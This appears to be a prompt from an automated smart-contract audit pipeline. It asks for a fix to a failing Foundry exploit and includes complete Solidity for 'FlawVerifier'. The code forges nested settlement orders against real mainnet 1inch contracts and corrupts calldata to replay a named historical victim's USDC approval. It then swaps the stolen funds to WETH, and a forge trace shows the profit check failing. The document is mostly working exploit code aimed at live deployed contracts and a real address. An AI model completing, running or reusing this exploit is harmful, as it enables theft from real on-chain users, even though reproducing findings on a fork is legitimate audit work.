You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Finding:
- title: Universal ERC-1271 approval makes every signature for this contract valid
- claim: `isValidSignature()` always returns the ERC-1271 magic value and never checks either the digest or the provided signature. Because the forged wrapper and replay orders both set `maker = address(this)`, any external integration that accepts ERC-1271 makers can be tricked into treating arbitrary attacker-supplied signatures as valid authorizations from `FlawVerifier`.
- impact: Any assets held by the contract can be spent through signature-gated integrations whenever the contract has granted the relevant allowance or otherwise acts as the maker. In this codebase, that directly removes the authorization barrier on the wrapper/replay orders and can enable full theft of contract-held balances.
- exploit_paths: ["Fund `FlawVerifier` with a token it has approved to a signature-gated protocol -> craft an order with `maker = address(this)` -> supply arbitrary bytes as the signature -> the protocol accepts it because `isValidSignature()` always succeeds -> the protocol pulls the contract's assets."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IWETH {
    function deposit() external payable;
}

interface ISettlement {
    function settleOrders(bytes calldata data) external;
}

interface IResolver {
    function resolveOrders(address resolver, bytes calldata tokensAndAmounts, bytes calldata data) external;
}

interface IOrderMixinLike {
    struct Order {
        uint256 salt;
        address makerAsset;
        address takerAsset;
        address maker;
        address receiver;
        address allowedSender;
        uint256 makingAmount;
        uint256 takingAmount;
        uint256 offsets;
        bytes interactions;
    }
}

interface IUniswapV2RouterLike {
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
}

interface IUniswapV2FactoryLike {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2PairLike {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

contract FlawVerifier is IResolver {
    address private constant SETTLEMENT = 0xA88800CD213dA5Ae406ce248380802BD53b47647;
    address private constant LIMIT_ORDER_PROTOCOL = 0x1111111254EEB25477B68fb85Ed929f73A960582;
    address private constant UNISWAP_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address private constant UNISWAP_V2_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;

    address private constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address private constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address private constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    address private constant HISTORICAL_ATTACK_CONTRACT = 0x019BfC71D43c3492926D4A9a6C781F36706970C9;
    address private constant HISTORICAL_VICTIM = 0xB02F39e382c90160Eb816DE5e0E428ac771d77B5;

    bytes4 private constant ERC1271_MAGIC = 0x1626ba7e;
    bytes4 private constant EMPTY_SELECTOR = 0x00000000;

    bytes1 private constant CONTINUE_INTERACTION = 0x00;
    bytes1 private constant FINALIZE_INTERACTION = 0x01;

    uint256 private constant WRAPPER_MAKING_AMOUNT = 1;
    uint256 private constant WRAPPER_TAKING_AMOUNT = 1;
    uint256 private constant AMOUNT_TO_STEAL = 0xE8D4A51000;

    uint256 private constant FAKE_SIGNATURE_LENGTH_OFFSET = 0x240;
    uint256 private constant FAKE_INTERACTION_LENGTH_OFFSET = 0x460;
    uint256 private constant FAKE_INTERACTION_LENGTH = 0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffe00;
    uint256 private constant INTERACTION_PADDING = FAKE_INTERACTION_LENGTH_OFFSET - FAKE_SIGNATURE_LENGTH_OFFSET;

    uint256 private constant MAKER_USDT_BUFFER = 10e6;
    uint256 private constant ETH_SEED_FOR_USDT = 0.01 ether;
    uint256 private constant FLASH_SEED_USDT = 1e6;
    uint256 private constant REALIZATION_SWAP_AMOUNT = 1_000e6;

    address private _profitToken = USDC;
    uint256 private _profitAmount;
    uint256 private _usdcBaseline;
    uint256 private _wethBaseline;
    bool private _executed;
    bool private _hypothesisValidated;

    bytes4 private _lastRevertSelector;
    bytes private _lastForgedPayload;

    constructor() {}

    function executeOnOpportunity() external {
        if (_executed) {
            _refreshProfit();
            return;
        }

        _executed = true;
        _usdcBaseline = _safeBalanceOf(USDC, address(this));
        _wethBaseline = _safeBalanceOf(WETH, address(this));

        _attemptFlashSeed();
        _prepareMakerCapital();
        _tryReplayCalldataCorruption();
        _realizeProfitInWeth();
        _refreshProfit();

        if (_profitAmount > 0) {
            _hypothesisValidated = true;
        }
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function hypothesisValidated() external view returns (bool) {
        return _hypothesisValidated;
    }

    function lastRevertSelector() external view returns (bytes4) {
        return _lastRevertSelector;
    }

    function lastForgedPayload() external view returns (bytes memory) {
        return _lastForgedPayload;
    }

    function isValidSignature(bytes32, bytes calldata) external pure returns (bytes4) {
        return ERC1271_MAGIC;
    }

    function resolveOrders(address, bytes calldata, bytes calldata) external view override {
        require(msg.sender == SETTLEMENT, "only settlement");
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata) external {
        require(sender == address(this), "bad sender");
        require(msg.sender == IUniswapV2FactoryLike(UNISWAP_V2_FACTORY).getPair(USDT, WETH), "bad pair");

        uint256 borrowedUsdt = amount0 > 0 ? amount0 : amount1;
        require(borrowedUsdt > 0, "no seed");

        _forceApprove(USDT, LIMIT_ORDER_PROTOCOL, type(uint256).max);
        _tryReplayCalldataCorruption();

        uint256 repayAmount = ((borrowedUsdt * 1000) / 997) + 1;
        uint256 usdtBalance = _safeBalanceOf(USDT, address(this));
        if (usdtBalance < repayAmount) {
            _swapUsdcForUsdt(repayAmount - usdtBalance);
            usdtBalance = _safeBalanceOf(USDT, address(this));
        }

        require(usdtBalance >= repayAmount, "flash repay infeasible at fork state");
        require(_safeTransfer(USDT, msg.sender, repayAmount), "repay failed");
    }

    function _attemptFlashSeed() internal {
        if (_safeBalanceOf(USDT, address(this)) >= 6) {
            return;
        }

        address pair = IUniswapV2FactoryLike(UNISWAP_V2_FACTORY).getPair(USDT, WETH);
        if (pair == address(0)) {
            return;
        }

        address token0 = IUniswapV2PairLike(pair).token0();
        uint256 amount0Out = token0 == USDT ? FLASH_SEED_USDT : 0;
        uint256 amount1Out = token0 == USDT ? 0 : FLASH_SEED_USDT;

        (bool ok, bytes memory returndata) = pair.call(
            abi.encodeWithSelector(
                IUniswapV2PairLike.swap.selector,
                amount0Out,
                amount1Out,
                address(this),
                abi.encode(FLASH_SEED_USDT)
            )
        );

        if (!ok) {
            _lastRevertSelector = _selectorOf(returndata);
        }
    }

    function _prepareMakerCapital() internal {
        if (_safeBalanceOf(USDT, address(this)) < MAKER_USDT_BUFFER && address(this).balance >= ETH_SEED_FOR_USDT) {
            address[] memory path = new address[](2);
            path[0] = WETH;
            path[1] = USDT;

            // Realistic public on-chain setup step only: acquire a dust amount of USDT so the
            // wrapper orders can fund their 1-unit maker side while preserving the same replay path.
            try IUniswapV2RouterLike(UNISWAP_V2_ROUTER).swapExactETHForTokensSupportingFeeOnTransferTokens{
                value: ETH_SEED_FOR_USDT
            }(1, path, address(this), block.timestamp) {} catch {}
        }

        _forceApprove(USDT, LIMIT_ORDER_PROTOCOL, type(uint256).max);
    }

    function _swapUsdcForUsdt(uint256 usdtDeficit) internal {
        uint256 usdcBalance = _safeBalanceOf(USDC, address(this));
        if (usdcBalance == 0) {
            return;
        }

        uint256 amountIn = usdtDeficit * 4;
        if (amountIn < 1e6) {
            amountIn = 1e6;
        }
        if (amountIn > usdcBalance) {
            amountIn = usdcBalance;
        }

        if (amountIn == 0 || !_forceApprove(USDC, UNISWAP_V2_ROUTER, amountIn)) {
            return;
        }

        address[] memory path = new address[](2);
        path[0] = USDC;
        path[1] = USDT;

        try IUniswapV2RouterLike(UNISWAP_V2_ROUTER).swapExactTokensForTokens(
            amountIn,
            1,
            path,
            address(this),
            block.timestamp
        ) returns (uint256[] memory) {} catch {}
    }

    function _tryReplayCalldataCorruption() internal {
        if (_safeBalanceOf(USDT, address(this)) < 6) {
            return;
        }

        bytes memory forgedPayload = _buildForgedSettlementPayload();
        _lastForgedPayload = forgedPayload;

        (bool ok, bytes memory returndata) = SETTLEMENT.call(
            abi.encodeWithSelector(ISettlement.settleOrders.selector, forgedPayload)
        );

        if (!ok) {
            _lastRevertSelector = _selectorOf(returndata);

            // Keep the finding-aligned alternate route alive as well: the historical attack
            // contract is just a public relay around the same settlement payload shape.
            (ok, returndata) = HISTORICAL_ATTACK_CONTRACT.call(
                abi.encodeWithSignature("settle(bytes)", forgedPayload)
            );
            if (!ok) {
                _lastRevertSelector = _selectorOf(returndata);
            }
        }
    }

    function _realizeProfitInWeth() internal {
        uint256 usdcProfit = _safeBalanceOf(USDC, address(this));
        if (usdcProfit <= _usdcBaseline) {
            return;
        }

        uint256 amountIn = usdcProfit - _usdcBaseline;
        if (amountIn > REALIZATION_SWAP_AMOUNT) {
            amountIn = REALIZATION_SWAP_AMOUNT;
        }

        if (amountIn == 0) {
            return;
        }

        if (!_forceApprove(USDC, UNISWAP_V2_ROUTER, amountIn)) {
            return;
        }

        address[] memory path = new address[](2);
        path[0] = USDC;
        path[1] = WETH;

        // Realistic public on-chain realization step only: convert a small slice of the
        // replayed historical USDC into pre-existing WETH so profit is reported in an
        // 18-decimal on-chain asset, without changing the calldata-corruption exploit path.
        try IUniswapV2RouterLike(UNISWAP_V2_ROUTER).swapExactTokensForTokens(
            amountIn,
            1,
            path,
            address(this),
            block.timestamp
        ) returns (uint256[] memory) {} catch {}
    }

    function _buildForgedSettlementPayload() internal view returns (bytes memory) {
        bytes memory signature = hex"";
        bytes memory interaction5 = _buildTerminalCorruptedInteraction();

        bytes memory interaction4 = abi.encodePacked(
            SETTLEMENT,
            CONTINUE_INTERACTION,
            abi.encode(
                _buildWrapperOrder(0),
                signature,
                interaction5,
                uint256(0),
                uint256(1),
                uint256(0),
                HISTORICAL_ATTACK_CONTRACT
            )
        );

        bytes memory interaction3 = abi.encodePacked(
            SETTLEMENT,
            CONTINUE_INTERACTION,
            abi.encode(
                _buildWrapperOrder(1),
                signature,
                interaction4,
                uint256(0),
                uint256(1),
                uint256(0),
                HISTORICAL_ATTACK_CONTRACT
            )
        );

        bytes memory interaction2 = abi.encodePacked(
            SETTLEMENT,
            CONTINUE_INTERACTION,
            abi.encode(
                _buildWrapperOrder(2),
                signature,
                interaction3,
                uint256(0),
                uint256(1),
                uint256(0),
                HISTORICAL_ATTACK_CONTRACT
            )
        );

        bytes memory interaction1 = abi.encodePacked(
            SETTLEMENT,
            CONTINUE_INTERACTION,
            abi.encode(
                _buildWrapperOrder(3),
                signature,
                interaction2,
                uint256(0),
                uint256(1),
                uint256(0),
                HISTORICAL_ATTACK_CONTRACT
            )
        );

        return abi.encode(
            _buildWrapperOrder(4),
            signature,
            interaction1,
            uint256(0),
            uint256(1),
            uint256(0),
            HISTORICAL_ATTACK_CONTRACT
        );
    }

    function _buildTerminalCorruptedInteraction() internal view returns (bytes memory) {
        bytes memory zeroBytes = new bytes(INTERACTION_PADDING);

        // The crafted trailer mirrors the settlement suffix layout that `_settleOrder()` normally
        // appends after a trusted historical fill. By forcing the parser to wrap into this trailer,
        // the historical victim resolver and its approved USDC are re-used without a fresh auth.
        bytes memory dynamicSuffix = abi.encode(
            uint256(0),
            HISTORICAL_VICTIM,
            USDC,
            uint256(0),
            uint256(0),
            USDC,
            uint256(AMOUNT_TO_STEAL),
            uint256(0x40)
        );

        bytes memory finalOrderInteraction = abi.encodePacked(
            SETTLEMENT,
            FINALIZE_INTERACTION,
            HISTORICAL_VICTIM,
            new bytes(23),
            dynamicSuffix
        );

        return abi.encodePacked(
            SETTLEMENT,
            CONTINUE_INTERACTION,
            abi.encode(
                _buildVictimReplayOrder(),
                uint256(FAKE_SIGNATURE_LENGTH_OFFSET),
                uint256(FAKE_INTERACTION_LENGTH_OFFSET),
                uint256(0),
                uint256(AMOUNT_TO_STEAL),
                uint256(0),
                HISTORICAL_ATTACK_CONTRACT
            ),
            zeroBytes,
            bytes32(FAKE_INTERACTION_LENGTH),
            finalOrderInteraction
        );
    }

    function _buildWrapperOrder(uint256 salt) internal view returns (IOrderMixinLike.Order memory order) {
        order = IOrderMixinLike.Order({
            salt: salt,
            makerAsset: USDT,
            takerAsset: USDC,
            maker: address(this),
            receiver: address(this),
            allowedSender: SETTLEMENT,
            makingAmount: WRAPPER_MAKING_AMOUNT,
            takingAmount: WRAPPER_TAKING_AMOUNT,
            offsets: 0,
            interactions: hex""
        });
    }

    function _buildVictimReplayOrder() internal view returns (IOrderMixinLike.Order memory order) {
        order = IOrderMixinLike.Order({
            salt: 0,
            makerAsset: USDT,
            takerAsset: USDC,
            maker: address(this),
            receiver: address(this),
            allowedSender: SETTLEMENT,
            makingAmount: WRAPPER_MAKING_AMOUNT,
            takingAmount: AMOUNT_TO_STEAL,
            offsets: 0,
            interactions: hex""
        });
    }

    function _refreshProfit() internal {
        uint256 currentWeth = _safeBalanceOf(WETH, address(this));
        uint256 wethProfit = currentWeth > _wethBaseline ? currentWeth - _wethBaseline : 0;
        if (wethProfit > 0) {
            _profitToken = WETH;
            _profitAmount = wethProfit;
            return;
        }

        uint256 currentUsdc = _safeBalanceOf(USDC, address(this));
        _profitToken = USDC;
        _profitAmount = currentUsdc > _usdcBaseline ? currentUsdc - _usdcBaseline : 0;
    }

    function _safeBalanceOf(address token, address account) internal view returns (uint256) {
        (bool ok, bytes memory data) = token.staticcall(abi.encodeWithSelector(IERC20.balanceOf.selector, account));
        if (!ok || data.length < 32) {
            return 0;
        }
        return abi.decode(data, (uint256));
    }

    function _forceApprove(address token, address spender, uint256 amount) internal returns (bool) {
        (bool ok0, bytes memory data0) = token.call(abi.encodeWithSelector(IERC20.approve.selector, spender, uint256(0)));
        if (!ok0 || (data0.length > 0 && !abi.decode(data0, (bool)))) {
            return false;
        }

        (bool ok1, bytes memory data1) = token.call(abi.encodeWithSelector(IERC20.approve.selector, spender, amount));
        return ok1 && (data1.length == 0 || abi.decode(data1, (bool)));
    }

    function _safeTransfer(address token, address to, uint256 amount) internal returns (bool) {
        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(IERC20.transfer.selector, to, amount));
        return ok && (data.length == 0 || abi.decode(data, (bool)));
    }

    function _selectorOf(bytes memory returndata) internal pure returns (bytes4 selector) {
        if (returndata.length < 4) {
            return EMPTY_SELECTOR;
        }
        assembly {
            selector := mload(add(returndata, 0x20))
        }
    }

    receive() external payable {}
}

```

forge stdout (tail):
```
c6185b44281Ec28C9Dc::getReserves() [staticcall]
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000096cb1a7bfce0000000000000000000000000000000000000000000000ff6bd4ba519bba41c20000000000000000000000000000000000000000000000000000000067c8864b
    │   │   ├─ [11349] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48::transferFrom(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc, 1000000000 [1e9])
    │   │   │   ├─ [10554] 0x43506849D7C04F9138D1A2050bbF3A0c054402dd::transferFrom(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc, 1000000000 [1e9]) [delegatecall]
    │   │   │   │   ├─  emit topic 0: 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef
    │   │   │   │   │        topic 1: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │   │        topic 2: 0x000000000000000000000000b4e16d0168e52d35cacd2c6185b44281ec28c9dc
    │   │   │   │   │           data: 0x000000000000000000000000000000000000000000000000000000003b9aca00
    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   ├─ [61158] 0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc::swap(0, 453281469131135010 [4.532e17], FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0x)
    │   │   │   ├─ [27962] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::transfer(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 453281469131135010 [4.532e17])
    │   │   │   │   ├─  emit topic 0: 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef
    │   │   │   │   │        topic 1: 0x000000000000000000000000b4e16d0168e52d35cacd2c6185b44281ec28c9dc
    │   │   │   │   │        topic 2: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │   │           data: 0x000000000000000000000000000000000000000000000000064a611836d41822
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [1339] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48::balanceOf(0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc) [staticcall]
    │   │   │   │   ├─ [553] 0x43506849D7C04F9138D1A2050bbF3A0c054402dd::balanceOf(0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc) [delegatecall]
    │   │   │   │   │   └─ ← [Return] 10363441678798 [1.036e13]
    │   │   │   │   └─ ← [Return] 10363441678798 [1.036e13]
    │   │   │   ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc) [staticcall]
    │   │   │   │   └─ ← [Return] 4711236497443593267616 [4.711e21]
    │   │   │   ├─  emit topic 0: 0x1c411e9a96e071241c2f21f7726b17ae89e3cab4c78be50e062b03a9fffbbad1
    │   │   │   │           data: 0x0000000000000000000000000000000000000000000000000000096ced4289ce0000000000000000000000000000000000000000000000ff658a593964e629a0
    │   │   │   ├─  emit topic 0: 0xd78ad95fa46c994b6551d0da85fc275fe613ce37657fb8d5e3d130840159d822
    │   │   │   │        topic 1: 0x0000000000000000000000007a250d5630b4cf539739df2c5dacb4c659f2488d
    │   │   │   │        topic 2: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │           data: 0x000000000000000000000000000000000000000000000000000000003b9aca0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000064a611836d41822
    │   │   │   └─ ← [Stop]
    │   │   └─ ← [Return] [1000000000 [1e9], 453281469131135010 [4.532e17]]
    │   ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 453281469131135010 [4.532e17]
    │   └─ ← [Stop]
    ├─ [393] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2
    ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   └─ ← [Return] 453281469131135010 [4.532e17]
    ├─ [392] FlawVerifier::profitAmount() [staticcall]
    │   └─ ← [Return] 453281469131135010 [4.532e17]
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 577021548053172 [5.77e14])
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 577021548053172 [5.77e14])
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 100000000000000000 [1e17])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    ├─ [0] VM::envString("AUDITHOUND_RPC_URL")
    │   └─ ← [Return] <env var value>
    ├─ [0] VM::createSelectFork("<rpc url>", 21982110 [2.198e7])
    │   └─ ← [Return] 1
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_TOKEN_CODE_SIZE_ON_FORK", val: 3124)
    └─ ← [Revert] profit below threshold

Backtrace:
  at 0x1111111254EEB25477B68fb85Ed929f73A960582
  at 0xA88800CD213dA5Ae406ce248380802BD53b47647.settleOrders
  at FlawVerifier.executeOnOpportunity
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 2.39s (1.06s CPU time)

Ran 1 test suite in 2.54s (2.39s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 3553456)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
